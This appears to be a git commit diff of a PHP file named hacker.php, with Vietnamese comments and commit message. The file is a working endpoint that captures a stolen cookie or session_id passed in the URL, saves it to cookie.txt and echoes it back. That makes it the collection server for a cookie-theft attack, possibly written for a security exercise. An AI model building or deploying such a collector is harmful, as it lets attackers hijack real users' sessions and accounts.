118c7dc72bc6decd8aa830147bde5d6a01aa7513
HanhTran1911 <tranhanh191103@gmail.com>
2023-09-22 22:18:26 +0700

    commit len hacker

--- hacker.php
+++ hacker.php
@@ -1,4 +1,19 @@
 <?php
-file_put_contents('cookie.txt',$_GET['cookie']);
-
-
+//file_put_contents('cookie.txt',$_GET['cookie']);
+$number = $_GET['session_id'];
+// Kiểm tra xem 'session_id' có giá trị không
+if (!empty($number)) {
+    // Mở tệp cookie.txt để ghi
+    $file = fopen("cookie.txt", "w");
+    
+    // Ghi giá trị 'session_id' vào tệp cookie.txt
+    fwrite($file, $number);
+    
+    // Đóng tệp
+    fclose($file);
+    
+    echo "Số đã được lưu vào cookie.txt: " . $number;
+} else {
+    echo "Không có số được truyền vào.";
+}
+?>
